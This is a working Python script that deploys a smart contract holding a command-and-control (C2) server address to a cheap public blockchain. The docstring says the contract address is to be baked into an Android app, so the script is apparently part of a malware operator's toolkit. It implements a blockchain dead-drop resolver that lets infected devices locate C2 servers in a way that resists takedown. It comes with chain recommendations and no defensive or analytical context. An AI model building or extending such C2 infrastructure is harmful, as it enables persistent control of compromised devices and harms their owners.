#!/usr/bin/env python3
"""Deploy EndpointRegistry.sol to an EVM chain.

Private key comes from env var GHOST_DEPLOY_KEY (hex, with or without 0x).
NEVER hardcode keys.

Usage:
    export GHOST_DEPLOY_KEY=0x...
    python3 deploy.py --rpc http://127.0.0.1:8545 --endpoint c2.example.com:443

Requires the compiled artifact from `forge build`:
    blockchain/out/EndpointRegistry.sol/EndpointRegistry.json

Chain suggestion (cheap, readable via free keyless public RPCs — see
rpc_list.py for 3+ URLs per chain):
    Polygon PoS (137)  — very cheap txs, many free public RPCs
    Base (8453)        — cheap, excellent public RPC availability
    Optimism (10)      — cheap alternative

The operator should use their own funded wallet on the chosen chain. This
deployment is a one-time action; only the resulting contract address + the
chain/RPC list get baked into the Android app.
"""

import argparse
import json
import os
import sys
from pathlib import Path

from ethlib import RPC, rlp_encode, keccak256, sign, privkey_to_address, \
    wait_receipt

HERE = Path(__file__).resolve().parent
ARTIFACT = HERE / "out" / "EndpointRegistry.sol" / "EndpointRegistry.json"


def encode_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return (32).to_bytes(32, "big") + len(b).to_bytes(32, "big") + \
        b + b"\x00" * ((-len(b)) % 32)


def load_key() -> bytes:
    k = os.environ.get("GHOST_DEPLOY_KEY")
    if not k:
        sys.exit("error: set GHOST_DEPLOY_KEY env var (hex private key)")
    return bytes.fromhex(k[2:] if k.startswith("0x") else k)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rpc", required=True, help="JSON-RPC URL")
    ap.add_argument("--endpoint", required=True,
                    help="initial C2 endpoint (host[:port])")
    ap.add_argument("--gas", type=int, default=None)
    args = ap.parse_args()

    if not ARTIFACT.exists():
        sys.exit(f"error: artifact not found: {ARTIFACT} — run `forge build` first")

    bytecode = json.loads(ARTIFACT.read_text())["bytecode"]["object"]
    if bytecode.startswith("0x"):
        bytecode = bytecode[2:]
    initcode = bytes.fromhex(bytecode) + encode_string(args.endpoint)

    priv = load_key()
    addr = privkey_to_address(priv)
    rpc = RPC(args.rpc)
    chain_id = int(rpc.call("eth_chainId", []), 16)
    print(f"deployer: {addr}  chainId: {chain_id}", file=sys.stderr)

    nonce = int(rpc.call("eth_getTransactionCount", [addr, "pending"]), 16)
    price = int(rpc.call("eth_gasPrice", []), 16)
    gas = args.gas or 800_000
    unsigned = [nonce, price, gas, b"", 0, initcode, chain_id, 0, 0]
    h = keccak256(rlp_encode(unsigned))
    r, s, v = sign(priv, h)
    signed = [nonce, price, gas, b"", 0, initcode, v + 35 + 2 * chain_id, r, s]
    raw = "0x" + rlp_encode(signed).hex()
    tx_hash = rpc.call("eth_sendRawTransaction", [raw])
    print(f"tx: {tx_hash}", file=sys.stderr)

    rc = wait_receipt(rpc, tx_hash)
    contract = rc["contractAddress"]
    print(contract)
    return


if __name__ == "__main__":
    main()
